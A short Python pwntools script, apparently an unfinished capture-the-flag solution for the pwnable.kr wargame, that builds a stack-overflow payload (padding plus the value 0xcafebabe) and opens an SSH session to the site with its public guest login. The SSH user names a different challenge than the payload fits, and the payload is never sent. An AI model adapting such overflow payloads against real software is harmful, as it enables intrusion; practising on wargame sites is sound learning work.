from pwn import *

payload = b'A' * 52 + b'\xbe\xba\xfe\xca'
shell = ssh(host="uaf@pwnable.kr",port=2222,password="guest",user="uaf")
